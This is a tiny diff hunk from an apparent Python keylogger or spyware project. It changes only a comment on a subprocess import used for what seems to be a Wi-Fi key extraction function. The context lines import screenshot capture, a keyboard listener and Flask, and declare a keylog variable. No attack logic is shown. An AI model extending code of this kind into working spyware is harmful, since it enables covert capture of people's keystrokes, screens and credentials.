@@ -18,7 +18,7 @@ import pyscreenshot as ImageGrab
 from flask import Flask, Response 
 from pynput.keyboard import Listener, Key 
 import platform
-import subprocess # Added for wfikey function
+import subprocess #for wfikey function
 
 #keylog variable
 log = ""
